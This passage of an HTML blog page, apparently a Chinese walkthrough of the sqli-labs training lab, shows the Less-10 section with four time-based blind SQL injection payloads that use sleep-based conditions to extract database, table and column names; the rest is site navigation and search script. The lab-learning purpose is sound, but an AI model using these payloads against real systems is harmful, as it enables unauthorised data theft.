+<h5 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h5><p>爆数据库第一个字母<br><code>?id=1&quot; and If(ascii(substr(database(),1,1))=115,1,sleep(5)) --+</code><br>爆第一个数据库(security)的第一个字母<br><code>?id=1&quot; and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) --+</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>?id=1&quot; and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) --+</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>?id=1&quot; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) --+</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/11/内网渗透之端口转发/" rel="next" title="内网渗透之端口转发">
+                <i class="fa fa-chevron-left"></i> 内网渗透之端口转发
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">wcute</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-1"><span class="nav-number">1.</span> <span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">1.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-2"><span class="nav-number">2.</span> <span class="nav-text">Less-2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-1"><span class="nav-number">2.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-3"><span class="nav-number">3.</span> <span class="nav-text">Less-3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-2"><span class="nav-number">3.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-4"><span class="nav-number">4.</span> <span class="nav-text">Less-4</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-3"><span class="nav-number">4.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-5"><span class="nav-number">5.</span> <span class="nav-text">Less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-4"><span class="nav-number">5.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-6"><span class="nav-number">6.</span> <span class="nav-text">Less-6</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-5"><span class="nav-number">6.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-7"><span class="nav-number">7.</span> <span class="nav-text">Less-7</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-6"><span class="nav-number">7.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-8"><span class="nav-number">8.</span> <span class="nav-text">Less-8</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-7"><span class="nav-number">8.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-9"><span class="nav-number">9.</span> <span class="nav-text">Less-9</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-8"><span class="nav-number">9.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-10"><span class="nav-number">10.</span> <span class="nav-text">Less-10</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-9"><span class="nav-number">10.1.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wcute</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
